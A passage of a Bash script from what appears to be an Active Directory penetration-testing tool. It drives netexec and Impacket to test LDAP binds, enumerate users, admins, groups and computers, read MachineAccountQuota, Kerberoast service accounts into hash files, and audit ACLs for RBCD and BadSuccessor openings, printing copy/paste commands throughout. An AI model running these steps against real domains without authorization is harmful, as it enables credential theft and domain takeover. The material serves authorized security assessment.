        if echo "$AUTH_OUT" | grep -Eq '^\s*LDAP\s+.*\[\+\]'; then
            LDAP_AUTH_BIND=true
            success "Authenticated LDAP bind using NTLM successful"
        else
            warn "Authenticated LDAP bind using NTLM failed"
        fi
    elif [[ "$USE_AUTH" == "auth" && "$CREDS_PROVIDED" == true ]]; then
        info "Testing Kerberos Authenticated LDAP bind ($AUTH_USER|$AUTH_PASS) - NTLM Not Supported"
        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
	echo -e "        ${GREEN}netexec ldap $TARGET_IPV4 -d $LDAP_DOMAIN -u '$AUTH_USER' -p '$AUTH_PASS' -k${RESET}"
	AUTH_OUT=$(netexec ldap "$TARGET_IPV4" -d "$LDAP_DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" -k 2>&1)
	if echo "$AUTH_OUT" | grep -Eq '^\s*LDAP\s+.*\[\+\]'; then
            LDAP_AUTH_BIND=true
            success "Authenticated LDAP bind successful using Kerberos"
        else
            warn "Authenticated LDAP bind using Kerberos failed! "
        fi
    fi

    ########################################
    # 3. Select Best Available Bind
    ########################################
    LDAP_EXEC_ARGS=()
    LDAP_BIND_TYPE=""

    if [[ "$LDAP_AUTH_BIND" == true ]]; then
        LDAP_BIND_TYPE="auth"
        LDAP_EXEC_ARGS=(-d "$LDAP_DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS")
    elif [[ "$LDAP_GUEST_BIND" == true ]]; then
        LDAP_BIND_TYPE="guest"
        LDAP_EXEC_ARGS=(-d "$LDAP_DOMAIN" -u "guest" -p "")
    elif [[ "$LDAP_ANON_BIND" == true ]]; then
        LDAP_BIND_TYPE="anon"
        LDAP_EXEC_ARGS=(--anonymous)
    else
        notify "LDAP service present but no usable bind available"
        set -e
        return
    fi
	
    ########################################
    # 3b. Export groups for authenticated user
    ########################################
    if [[ "$LDAP_BIND_TYPE" == "auth" ]]; then
        export_authenticated_user_groups || true
    fi

    if [[ $NTLM_ENABLED == true ]]; then
        success "Using NTLM LDAP bind type: ${BLUE}$LDAP_BIND_TYPE${RESET}"
    else
        success "Using Kerberos LDAP bind type: ${BLUE}$LDAP_BIND_TYPE${RESET}"
    fi
    echo
    ########################################
    # 4a. Enumerate ALL Users
    ########################################
    DATE_TAG=$(date +"%Y%m%d_%H%M%S")
    LDAP_USERS_TMP="users_${TARGET_IPV4}_${DATE_TAG}.txt"
    LDAP_USERS_CSV="users_${TARGET_IPV4}_${DATE_TAG}.csv"
    info "Enumerating Users via LDAP..."
    if [[ "$NTLM_ENABLED" == true ]]; then
        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} --users${RESET}"
        #mapfile -t LDAP_USERS < <(
            #$LDAP_TOOL ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" --users 2>/dev/null \
            #    | sed -nE '
            #        /^\s*LDAP/ {
            #            /\[|\]|-Username-|Enumerated/ b
            #            s/^.*AUTHORITY[[:space:]]+([A-Za-z0-9._-]+)[[:space:]].*$/\1/p
            #        }
            #    ' \
            #    | sort -u
        #)
        mapfile -t LDAP_USERS < <(
            netexec ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" --users 2>/dev/null \
                | awk '
                    $1 == "LDAP" && $5 != "-Username-" && $5 != "" && $5 !~ /^\[|\]/ {
                        print $5
                    }
                ' \
                | grep -v '^$' \
                | sort -u
        )
    else
        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        echo -e "        ${GREEN}netexec ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} -k --users${RESET}"
        mapfile -t LDAP_USERS < <(
            netexec ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" -k --users 2>/dev/null \
                | awk '
                    $1 == "LDAP" && $5 != "-Username-" && $5 != "" && $5 !~ /^\[|\]/ {
                        print $5
                    }
                ' \
                | grep -v '^$' \
                | sort -u
        )
    fi
    #Save Findings... if any
    if [[ ${#LDAP_USERS[@]} -gt 0 ]]; then
        printf "%s\n" "${LDAP_USERS[@]}" > "$LDAP_USERS_TMP"
        
        # Write all users to CSV
        {
            echo "Username"
            printf "%s\n" "${LDAP_USERS[@]}"
        } > "$LDAP_USERS_CSV"
        success "All users saved to CSV: ${BLUE}$LDAP_USERS_CSV${RESET}"
        
        if [[ -z "${USERS_FILE:-}" ]]; then
            USERS_FILE="$LDAP_USERS_TMP"
            export USERS_FILE
            success "All users saved to TXT: ${BLUE}$USERS_FILE${RESET}"
        fi
        
        # Display only first 25 users
        print_section "Users Discovered (first 25 shown):" "${LDAP_USERS[@]:0:25}"
    else
        warn "No users parsed from LDAP output"
    fi
    echo
    ########################################
    # 4b. Enumerate ADMIN Users
    ########################################
    DATE_TAG=$(date +"%Y%m%d_%H%M%S")
    LDAP_PRIV_USERS_TMP="admin_users_${TARGET_IPV4}_${DATE_TAG}.txt"
    LDAP_PRIV_USERS_CSV="admin_users_${TARGET_IPV4}_${DATE_TAG}.csv"
    info "Enumerating Admin/Privileged Users via LDAP..."
    if [[ "$NTLM_ENABLED" == true ]]; then
        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} --admin-count${RESET}"
        #mapfile -t LDAP_ADMIN_USERS < <(
        #    $LDAP_TOOL ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" --admin-count 2>/dev/null \
        #        | sed -nE '
        #            /^\s*LDAP/ {
        #                /\[|\]|-Username-|Enumerated/ b
        #                s/^.*AUTHORITY[[:space:]]+([A-Za-z0-9._-]+)[[:space:]].*$/\1/p
        #            }
        #        ' \
        #        | sort -u
        #)
        mapfile -t LDAP_ADMIN_USERS < <(
            netexec ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" --admin-count 2>/dev/null \
                | awk '
                    $1 == "LDAP" &&
                    $5 != "" &&
                    $5 !~ /^\[|\]/ {
                        print $5
                    }
                ' \
                | sort -u
        )
    else
        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        echo -e "        ${GREEN}netexec ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} -k --admin-count${RESET}"
        mapfile -t LDAP_ADMIN_USERS < <(
            netexec ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" -k --admin-count 2>/dev/null \
                | awk '
                    $1 == "LDAP" &&
                    $5 != "" &&
                    $5 !~ /^\[|\]/ {
                        print $5
                    }
                ' \
                | sort -u
        )
    fi

    if [[ ${#LDAP_ADMIN_USERS[@]} -gt 0 ]]; then
        printf "%s\n" "${LDAP_ADMIN_USERS[@]}" > "$LDAP_PRIV_USERS_TMP"
        
        # Write all users to CSV
        {
            echo "Username"
            printf "%s\n" "${LDAP_ADMIN_USERS[@]}"
        } > "$LDAP_PRIV_USERS_CSV"
        success "All Admin Users saved to CSV: ${BLUE}$LDAP_PRIV_USERS_CSV${RESET}"
        
        if [[ -z "${PRIV_USERS_FILE:-}" ]]; then
            PRIV_USERS_FILE="$LDAP_PRIV_USERS_TMP"
            export PRIV_USERS_FILE
            success "All Admin Users saved to TXT: ${BLUE}$PRIV_USERS_FILE${RESET}"
        fi
        
        # Display only first 25 users
        print_section "Admin Users Discovered (first 25 shown):" "${LDAP_ADMIN_USERS[@]:0:25}"
    else
        warn "No admin/privileged users parsed from LDAP output"
    fi
    echo
    ########################################
    # 5. Enumerate Groups (LIMITED DISPLAY + CSV)
    ########################################
    info "Enumerating groups"
    
    # Parse groups with membercount
    if [[ "$NTLM_ENABLED" == true ]]; then
        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} --groups${RESET}"
        #mapfile -t LDAP_GROUPS_RAW < <(
        #    $LDAP_TOOL ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" --groups 2>/dev/null \
        #        | sed -nE '
        #            /^\s*LDAP.*membercount:/ {
        #                s/^.*AUTHORITY[[:space:]]+//
        #                s/[[:space:]]+membercount:/|/g
        #                s/^[[:space:]]+|[[:space:]]+$//g
        #                p
        #            }
        #        ' \
        #        | sort -u
        #)
        mapfile -t LDAP_GROUPS_RAW < <(
            netexec ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" --groups 2>/dev/null \
                | awk '
                    /^\s*LDAP/ && $6 ~ /^[1-9][0-9]*$/ {
                        # Reconstruct: GroupName|MemberCount|Description
                        group = $5
                        member_count = $6
                        # Capture everything after the member count (description)
                        $1=""; $2=""; $3=""; $4=""; $5=""; $6=""
                        desc = substr($0, index($0, $7))
                        gsub(/^[[:space:]]+|[[:space:]]+$/, "", desc)
                        printf "%s|%s|%s\n", group, member_count, desc
                    }
                ' | sort -u
        )
    else
        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        echo -e "        ${GREEN}netexec ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} -k --groups${RESET}"
        mapfile -t LDAP_GROUPS_RAW < <(
            netexec ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" -k --groups 2>/dev/null \
                | awk '
                    /^\s*LDAP/ && $6 ~ /^[1-9][0-9]*$/ {
                        # Reconstruct: GroupName|MemberCount|Description
                        group = $5
                        member_count = $6
                        # Capture everything after the member count (description)
                        $1=""; $2=""; $3=""; $4=""; $5=""; $6=""
                        desc = substr($0, index($0, $7))
                        gsub(/^[[:space:]]+|[[:space:]]+$/, "", desc)
                        printf "%s|%s|%s\n", group, member_count, desc
                    }
                ' | sort -u
        )
    fi

    # Separate names and counts for display
    LDAP_GROUPS=()
    for g in "${LDAP_GROUPS_RAW[@]}"; do
        LDAP_GROUPS+=("${g%%|*}")   # Extract just the name for printing
    done

    # Print only the first 25 groups
    if [[ ${#LDAP_GROUPS[@]} -gt 0 ]]; then
        print_section "Security Groups (first 25 shown):" "${LDAP_GROUPS[@]:0:25}"
        # Save all to CSV (GroupName,MemberCount)
        LDAP_GROUPS_CSV="groups_${TARGET}_$(date +%Y%m%d_%H%M%S).csv"
        {
            echo "GroupName,MemberCount"
            for g in "${LDAP_GROUPS_RAW[@]}"; do
                echo "$g"
            done
        } > "$LDAP_GROUPS_CSV"

        success "All groups saved to CSV: ${BLUE}$LDAP_GROUPS_CSV${RESET}"
    else
        warn "No security groups parsed from LDAP output"
    fi
    echo
    ########################################
    # 6. Enumerate Computers
    ########################################
    info "Enumerating computers"
    DATE_TAG=$(date +"%Y%m%d_%H%M%S")
    LDAP_COMPUTERS_CSV="computers_${TARGET}_${DATE_TAG}.csv"
    if [[ "$NTLM_ENABLED" == true ]]; then
        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} --computers${RESET}"
        mapfile -t LDAP_COMPUTERS < <(
            $LDAP_TOOL ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" --computers 2>/dev/null \
                | awk '{print $NF}' \
                | grep '\$$' \
                | sort -u
        )
    else
        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        echo -e "        ${GREEN}netexec ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} -k --computers${RESET}"
        mapfile -t LDAP_COMPUTERS < <(
            netexec ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" -k --computers 2>/dev/null \
                | awk '{print $NF}' \
                | grep '\$$' \
                | sort -u
        )
    fi
    
    if [[ ${#LDAP_COMPUTERS[@]} -gt 0 ]]; then
        # Write ALL computers to CSV
        {
            echo "ComputerName"
            printf "%s\n" "${LDAP_COMPUTERS[@]}"
        } > "$LDAP_COMPUTERS_CSV"

        success "All computers saved to CSV: ${BLUE}$LDAP_COMPUTERS_CSV${RESET}"

        # Display ONLY first 25
        print_section "Computers Discovered (first 25 shown):" "${LDAP_COMPUTERS[@]:0:25}"

    else
        warn "No computers parsed from LDAP output"
    fi
    echo
    ########################################
    # 7. MachineAccountQuota
    ########################################
    info "Enumerating MachineAccountQuota"
    if [[ "$NTLM_ENABLED" == true ]]; then
        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} -M maq${RESET}"
        MAQ_VALUE=$(
            timeout 15 $LDAP_TOOL ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" -M maq 2>/dev/null \
                | tr -d '\000' \
                | awk -F': ' '/MachineAccountQuota/ {print $2}' \
                | tail -n1
        )
    else
        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        echo -e "        ${GREEN}netexec ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} -k -M maq${RESET}"
        MAQ_VALUE=$(
            timeout 15 netexec ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" -k -M maq 2>/dev/null \
                | tr -d '\000' \
                | awk -F': ' '/MachineAccountQuota/ {print $2}' \
                | tail -n1
        )
    fi

    if [[ -n "$MAQ_VALUE" && "$MAQ_VALUE" =~ ^[0-9]+$ ]]; then
        if (( MAQ_VALUE > 0 )); then
            MAQ_ENABLED=true
            CAN_JOIN_COMPUTERS_TO_DOMAIN=true
            MACHINE_ACCOUNT_QUOTA="$MAQ_VALUE"
            critical "MachineAccountQuota = $MAQ_VALUE (user can add computers)"
        else
            success "MachineAccountQuota = 0 (no domain join privilege)"
        fi
    else
        warn "MachineAccountQuota not detected in LDAP output"
    fi
    echo
    ########################################
    # 8. Kerberoast Surface (FILE-BASED)
    ########################################
    info "Enumerating Kerberoastable accounts"
    DATE_TAG=$(date +"%Y%m%d_%H%M%S")
    KERBEROAST_OUT="kerberoast_${TARGET_IPV4}_${DATE_TAG}.txt"
    if [[ "$NTLM_ENABLED" == true ]]; then
        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} --kerberoasting $KERBEROAST_OUT${RESET}"
        timeout 15 $LDAP_TOOL ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" --kerberoasting "$KERBEROAST_OUT" 2>/dev/null
    else
        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        echo -e "        ${GREEN}netexec ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} -k --kerberoasting $KERBEROAST_OUT${RESET}"
        timeout 15 netexec ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" -k --kerberoasting "$KERBEROAST_OUT" 2>/dev/null
    fi

    # Validate output file
    if [[ -f "$KERBEROAST_OUT" && -s "$KERBEROAST_OUT" ]]; then
        success "Kerberoastable accounts identified"
        success "Kerberoast hashes saved to: ${BLUE}$KERBEROAST_OUT${RESET}"
        parse_kerberoast_metadata "$KERBEROAST_OUT" || true
        
        # Run impacket-GetUserSPNs and parse SPNs into array
        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        echo -e "        ${GREEN}impacket-GetUserSPNs '${LDAP_DOMAIN}/${AUTH_USER}:${AUTH_PASS}' -k -dc-ip $TARGET_IPV4 -dc-host $DOMAIN_CONTROLLER${RESET}"
        SPN_ENUM_OUTPUT=$(impacket-GetUserSPNs "${LDAP_DOMAIN}/${AUTH_USER}:${AUTH_PASS}" -k -dc-ip "$TARGET_IPV4" -dc-host "$DOMAIN_CONTROLLER" 2>/dev/null)

        if parse_getuserspns_output "$SPN_ENUM_OUTPUT"; then
            print_section "Service Principal Names (via GetUserSPNs):" "${SPN_LIST[@]}"
        else
            warn "No SPNs found via GetUserSPNs"
        fi
        if [[ ${#SPN_USER_LIST[@]} -gt 0 ]]; then
            print_section "Usernames with SPNS (via GetUserSPNs):" "${SPN_USER_LIST[@]}"
            KERBEROAST_USER="${SPN_USER_LIST[0]}"
        else
            warn "No Usernames found via GetUserSPNs"
        fi

        if [[ ${#KERBEROAST_TARGETS[@]} -gt 0 ]]; then
            print_section "Kerberoast Targets (SPNs):" "${KERBEROAST_TARGETS[@]}"

        fi
    else
        warn "No kerberoastable accounts found (output file empty or not created)"
        rm -f "$KERBEROAST_OUT" 2>/dev/null
    fi
    
    echo
    ########################################
    # 8b. Read-only DACL audit with Impacket
    ########################################
    if [[ "$LDAP_BIND_TYPE" == "auth" ]]; then
        info "Checking Active Directory for writable objects and exploitable ACL permissions (Authenticated only)"
        note "Impacket checks selected high-value objects; bloodyAD searches directory-wide for effective write access"
        run_impacket_dacl_audit || true
        run_bloodyad_writable_audit || true
    fi
    
    echo
    ########################################
    # 9. Writable Computer Objects (RBCD Check — Auth Only)
    ########################################
    if [[ "$LDAP_BIND_TYPE" == "auth" ]]; then
        info "Checking for writable computer object ACLs (Resource-Based Constrained Delegation [RBCD] - Authenticated only)"
        
        DACL_OUT=""
        DACL_RC=0
        
        #if [[ "$NTLM_ENABLED" == true ]]; then
        #    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        #    echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} -M daclread -o 'TARGET_DN=CN=Computers,$LDAP_BASE_DN' ACTION=read${RESET}"
	#
        #    DACL_OUT=$(
        #        timeout 15 $LDAP_TOOL ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" -M daclread \
        #        -o "TARGET_DN=CN=Computers,$LDAP_BASE_DN" ACTION=read 2>/dev/null
        #    )
        #else
        #    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        #    echo -e "        ${GREEN}netexec ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} -k -M daclread -o 'TARGET_DN=CN=Computers,$LDAP_BASE_DN' ACTION=read${RESET}"
        #
        #    DACL_OUT=$(
        #       timeout 15 netexec ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" -k -M daclread \
        #        -o "TARGET_DN=CN=Computers,$LDAP_BASE_DN" ACTION=read 2>/dev/null
        #    )
        #fi
        
        if [[ "$NTLM_ENABLED" == true ]]; then
            echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
            echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} -M daclread -o 'TARGET_DN=CN=Computers,$LDAP_BASE_DN' ACTION=read${RESET}"

            set +e
            DACL_OUT=$(
                timeout 15 "$LDAP_TOOL" ldap "$TARGET_IPV4" \
                    "${LDAP_EXEC_ARGS[@]}" \
                    -M daclread \
                    -o "TARGET_DN=CN=Computers,$LDAP_BASE_DN" \
                    ACTION=read \
                    2>&1
            )
            DACL_RC=$?
            set -e
        else
            echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
            echo -e "        ${GREEN}netexec ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} -k -M daclread -o 'TARGET_DN=CN=Computers,$LDAP_BASE_DN' ACTION=read${RESET}"

            set +e
            DACL_OUT=$(
                timeout 15 netexec ldap "$TARGET_IPV4" \
                    "${LDAP_EXEC_ARGS[@]}" \
                    -k \
                    -M daclread \
                    -o "TARGET_DN=CN=Computers,$LDAP_BASE_DN" \
                    ACTION=read \
                    2>&1
            )
            DACL_RC=$?
            set -e
        fi
	
	if detect_kerberos_clock_skew "$DACL_OUT"; then
            warn "RBCD ACL result is unknown because Kerberos authentication failed"
            RBCD_CHECK_STATUS="clock_skew"
            HAS_WRITABLE_COMPUTER_ACL=false
            return
        elif [[ $DACL_RC -eq 124 ]]; then
            warn "RBCD ACL check timed out after 15 seconds"
            RBCD_CHECK_STATUS="timeout"
            HAS_WRITABLE_COMPUTER_ACL=false
            return
        elif [[ $DACL_RC -ne 0 ]]; then
            warn "RBCD ACL check failed with exit code $DACL_RC"
            note "The result is unknown; no clean ACL conclusion can be made"

            printf '%s\n' "$DACL_OUT" |
                tail -n 10 |
                sed 's/^/     /'
            RBCD_CHECK_STATUS="error"
            HAS_WRITABLE_COMPUTER_ACL=false
            return
        else
            RBCD_CHECK_STATUS="success"
        fi
	
        # Detect ACEs with writable permissions that apply to computer objects.
	# Capture AWK status separately so a parser failure is not reported as
	# "No writable computer ACLs found."

	RBCD_PARSE_OK=false
	RBCD_PARSED=""

	if RBCD_PARSED=$(
	    printf '%s\n' "$DACL_OUT" |
	    awk '
		function reset_ace() {
		    ace_idx = ""
		    access_mask = ""
		    object_type = ""
		    inherited_type = ""
		    trustee = ""
		}

		function emit_ace() {
		    if (ace_idx == "" || trustee == "")
			return

		    # Keep each assignment on one line for mawk/POSIX awk compatibility.
		    broad_write = (access_mask ~ /(FullControl|GenericAll|GenericWrite|WriteOwner|WriteDACL)/)
		    property_write = (access_mask ~ /WritePropert(y|ies)/)
		    computer_scope = (object_type ~ /:[[:space:]]*Computer([[:space:]]|\(|$)/ || inherited_type ~ /:[[:space:]]*Computer([[:space:]]|\(|$)/)
		    rbcd_property = (object_type ~ /ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity/)

		    if ((computer_scope && broad_write) || (computer_scope && property_write && (object_type == "" || rbcd_property)) || (property_write && rbcd_property)) {
			scope_line = object_type

			if (!rbcd_property && inherited_type != "")
			    scope_line = inherited_type

			print ace_idx
			print access_mask
			print scope_line
			print trustee
		    }
		}

		BEGIN {
		    reset_ace()
		}

		/ACE\[[0-9]+\][[:space:]]+info/ {
		    emit_ace()
		    reset_ace()
		    ace_idx = $0
		    next
		}

		/Access mask[[:space:]]*:/ {
		    access_mask = $0
		    next
		}

		/Object type \(GUID\)[[:space:]]*:/ {
		    object_type = $0
		    next
		}

		/Inherited type \(GUID\)[[:space:]]*:/ {
		    inherited_type = $0
		    next
		}

		/Trustee \(SID\)[[:space:]]*:/ {
		    trustee = $0
		    next
		}

		END {
		    emit_ace()
		}
	    '
	); then
	    RBCD_PARSE_OK=true
	fi

	RBCD_ACES=()

	if [[ "$RBCD_PARSE_OK" == true && -n "$RBCD_PARSED" ]]; then
	    mapfile -t RBCD_ACES <<< "$RBCD_PARSED"
	fi

	if [[ "$RBCD_PARSE_OK" != true ]]; then
	    warn "Failed to parse NetExec daclread output; RBCD status is unknown"

	elif (( ${#RBCD_ACES[@]} > 0 )); then
	    risk "Potential RBCD-related writable computer ACLs detected:"
	    echo

	    for ((i = 0; i < ${#RBCD_ACES[@]}; i += 4)); do
		echo -e "${YELLOW} ${RBCD_ACES[i]}${RESET}"
		echo -e " ${RED}${RBCD_ACES[i + 1]}${RESET}"
		echo -e " ${BLUE}${RBCD_ACES[i + 2]}${RESET}"
		echo -e " ${GREEN}${RBCD_ACES[i + 3]}${RESET}"
		echo
	    done

	    HAS_WRITABLE_COMPUTER_ACL=true
	    RBCD_CANDIDATE_FOUND=true
	    RBCD_AUDIT_DONE=true

	    info "Next Step: Validate the trustee against the authenticated user and their groups."
	    echo -e "  ${GREEN}BloodHound, PowerView, or Impacket delegation tooling${RESET}"
	    
	    RBCD_APPLICABLE_ACL=false
	    RBCD_APPLICABLE_TRUSTEES=()

	    for ((i = 0; i + 3 < ${#RBCD_ACES[@]}; i += 4)); do
	        trustee_line="${RBCD_ACES[i + 3]}"

	        # Extract:
	        #   Account Operators
	        # from:
	        #   Trustee (SID) : Account Operators (S-1-5-32-548)
	        trustee_value="${trustee_line##*: }"
	        trustee_name="${trustee_value% (*}"
	        trustee_short="${trustee_name##*\\}"

	        trustee_lc="${trustee_short,,}"
	        auth_user_lc="${AUTH_USER,,}"

	        trustee_applies=false

	        # Direct user ACE.
	        if [[ -n "$auth_user_lc" && "$trustee_lc" == "$auth_user_lc" ]]; then
		    trustee_applies=true
	        fi

	        # Broad authenticated identities.
	        case "$trustee_lc" in
	    	    "authenticated users"|"everyone")
	    	        trustee_applies=true
	    	        ;;
	        esac

	        # Group-derived ACE.
	        if [[ "$trustee_applies" != true ]]; then
		    for group_name in "${AUTH_USER_GROUP_NAMES[@]}"; do
	    	        group_short="${group_name##*\\}"

		        if [[ "${group_short,,}" == "$trustee_lc" ]]; then
		            trustee_applies=true
		            break
		        fi
	    	    done
	        fi

	        if [[ "$trustee_applies" == true ]]; then
	    	    RBCD_APPLICABLE_ACL=true
		    RBCD_APPLICABLE_TRUSTEES+=("$trustee_value")
	        fi
	    done
	else
	    success "No RBCD-relevant writable computer ACLs found in the parsed DACL"
	    RBCD_AUDIT_DONE=true
	    RBCD_PARSE_OK=true
	fi
    else
        info "Skipping RBCD check — authenticated bind required"
    fi

    ########################################
    # Done
    ########################################
    LDAP_ENUM_DONE=true
    set -e
}

check_badsuccessor() {
  local tool dc_target domain evidence_dir safe_target rc output sanitized_output
  local candidate_lines candidate_count line principal principal_short principal_lc
  local auth_user_lc group_name group_short repeatable
  local applies
  local -a cmd=()
  local -a display_cmd=()

  #BADSUCCESSOR_CHECK_DONE=true
  #BADSUCCESSOR_DC_2025=false
  #BADSUCCESSOR_CANDIDATES_FOUND=false
  #BADSUCCESSOR_APPLICABLE=false
  #BADSUCCESSOR_APPLICABLE_TRUSTEES=()

  dc_target="${TARGET_IPV4:-$TARGET}"

  if [[ "${NTLM_ENABLED:-true}" != true ]]; then
    dc_target="$(get_preferred_dc_host "$dc_target")"
  fi

  if [[ -z "${AUTH_USER:-}" || -z "${AUTH_PASS:-}" ]]; then
    warn "BadSuccessor assessment requires authenticated LDAP credentials"
    return 1
  fi

  domain="${AUTH_DOMAIN:-${LDAP_DOMAIN:-}}"
  if [[ -z "$domain" ]]; then
    warn "Domain is unknown — skipping BadSuccessor assessment"
    return 1
  fi

  if command -v netexec >/dev/null 2>&1; then
    tool="netexec"
  elif command -v nxc >/dev/null 2>&1; then
    tool="nxc"
  else
    warn "NetExec was not found — skipping ActiveDirectory/DC versation enum & BadSuccessor assessment"
    lightbulb "Install or update NetExec, then verify: nxc ldap -L | grep -i badsuccessor"
    return 1
  fi
  
  # Gather Domain Controller/AD Version
  ldap_filter='(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))'
  ldap_attributes='dNSHostName operatingSystem operatingSystemVersion'
  cmd=(
    "$tool" ldap "$dc_target"
    -d "$domain"
    -u "$AUTH_USER"
    -p "$AUTH_PASS"
    --query "$ldap_filter"
    "$ldap_attributes"
  )

  display_cmd=(
    "$tool" ldap "$dc_target"
    -d "$domain"
    -u "$AUTH_USER"
    -p "$AUTH_PASS"
    --query "$ldap_filter"
    "$ldap_attributes"
  )

  if [[ "${NTLM_ENABLED:-true}" != true ]]; then
    cmd+=( -k )
    display_cmd+=( -k )
  fi

  printf -v repeatable '%q ' "${display_cmd[@]}"
  repeatable="${repeatable% }"
  
  evidence_dir="${EVIDENCE_DIR:-.}"
  mkdir -p "$evidence_dir"

  safe_target="$(sanitize_name "${TARGET_IPV4:-${TARGET:-$domain}}")"
  DC_VERSION_EVIDENCE="$evidence_dir/dc_version_${safe_target}_$(date +%Y%m%d_%H%M%S).txt"
  
  echo
  info "Obtaining domain controller operating-system versions"
  echo -e " ${YELLOW}${ICON_TIP:-[*]} Copy/Paste:${RESET}"
  echo -e " ${GREEN}${repeatable}${RESET}"

  if declare -F record_command >/dev/null 2>&1; then
    record_command "LDAP" "Domain controller version lookup" "$repeatable"
  fi
  
  [[ $- == *e* ]] && errexit_was_set=true
  set +e

  output=$("${cmd[@]}" 2>&1)
  rc=$?

  if [[ "$errexit_was_set" == true ]]; then
    set -e
  fi

  # Remove terminal color codes before parsing.
  clean_output=$(
    printf '%s\n' "$output" |
      sed -E $'s/\033\\[[0-9;]*[[:alpha:]]//g'
  )

  # Redact the password from the successful authentication line.
  sanitized_output=$(
    printf '%s\n' "$clean_output" |
      sed -E \
        '/^[[:space:]]*LDAP[[:space:]].*\[\+\].*\\/ s/:[^[:space:]]+/:<REDACTED>/'
  )

  printf '%s\n' "$sanitized_output" |
    tee "$DC_VERSION_EVIDENCE"

  if (( rc != 0 )); then
    if declare -F detect_kerberos_clock_skew >/dev/null 2>&1 &&
       detect_kerberos_clock_skew "$clean_output"; then
      :
    elif grep -qiE \
      'STATUS_LOGON_FAILURE|KDC_ERR|LDAPSessionError|invalid credentials|authentication failed' \
      <<< "$clean_output"; then
      warn "LDAP authentication failed during domain controller version lookup"
    else
      warn "Domain controller version lookup failed with exit code $rc"
    fi

    return "$rc"
  fi

  records=$(
    printf '%s\n' "$clean_output" |
      awk '
        function flush_record() {
          if (dn != "" || hostname != "" || os != "" || version != "") {
            print dn "|" hostname "|" os "|" version
          }

          dn=""
          hostname=""
          os=""
          version=""
        }

        /Response for object:/ {
          flush_record()

          dn=$0
          sub(/^.*Response for object:[[:space:]]*/, "", dn)
          next
        }

        {
          line=$0

          sub(
            /^[[:space:]]*LDAP[[:space:]]+[^[:space:]]+[[:space:]]+[^[:space:]]+[[:space:]]+[^[:space:]]+[[:space:]]+/,
            "",
            line
          )

          if (line ~ /^operatingSystemVersion[[:space:]]+/) {
            sub(/^operatingSystemVersion[[:space:]]+/, "", line)
            version=line
            next
          }

          if (line ~ /^operatingSystem[[:space:]]+/) {
            sub(/^operatingSystem[[:space:]]+/, "", line)
            os=line
            next
          }

          if (line ~ /^dNSHostName[[:space:]]+/) {
            sub(/^dNSHostName[[:space:]]+/, "", line)
            hostname=line
            next
          }
        }

        END {
          flush_record()
        }
      '
  )

  if [[ -z "$records" ]]; then
